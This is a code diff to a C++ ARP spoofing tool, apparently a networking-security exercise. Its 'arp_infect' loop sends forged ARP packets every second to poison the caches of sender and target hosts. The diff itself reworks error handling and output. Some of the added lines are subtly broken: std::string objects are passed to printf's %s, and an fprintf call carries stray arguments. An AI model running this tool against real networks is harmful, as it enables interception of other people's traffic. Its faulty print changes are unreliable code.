@@ -137,10 +137,13 @@ int flow_init(char* dev, Ip sender_ipaddr, Ip target_ipaddr, flowset* flowstate)
 }
 
 int arp_infect(pcap_t* handle) {
-	while(1) {
+	while(true) {
 		for(auto flowset : flow) {
 			int res = pcap_sendpacket(handle, reinterpret_cast<u_char*>(&flowset.infect_pkt), sizeof(EthArpPacket));
-			if(res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			if(res != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+				return -1;
+			}
 		}
 		sleep(1);
 	}
@@ -174,7 +177,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	if (attacker_info(dev) < 0) {
-		printf("failed to get attacker's info!\n");
+		fprintf(stderr, "failed to get attacker's info!\n", dev, errbuf);
 		return -1;
 	}
 
@@ -184,10 +187,13 @@ int main(int argc, char* argv[]) {
 		Ip target_ipaddr = Ip(argv[2*i+3]);
 		flowset flowstate;
 		int res = flow_init(dev, sender_ipaddr, target_ipaddr, &flowstate);
-		if (res == -1) break;
+		if (res == -1) {
+			printf("failed to get sender and target's info!\n");
+			break;
+		}
 		flow.push_back(flowstate);
-		cout << "sender ip : " << string(flowstate.sender_ipaddr) << ", sender mac : " << string(flowstate.sender_macaddr) << endl;
-		cout << "target ip : " << string(flowstate.target_ipaddr) << ", target mac : " << string(flowstate.target_macaddr) << endl;
+		printf("sender ip : %s, sender mac : %s\n", string(flowstate.sender_ipaddr), string(flowstate.sender_macaddr));
+		printf("target ip : %s, target mac : %s\n", string(flowstate.target_ipaddr), string(flowstate.target_macaddr));
 	}
 	pcap_close(handle);
 	return 0;
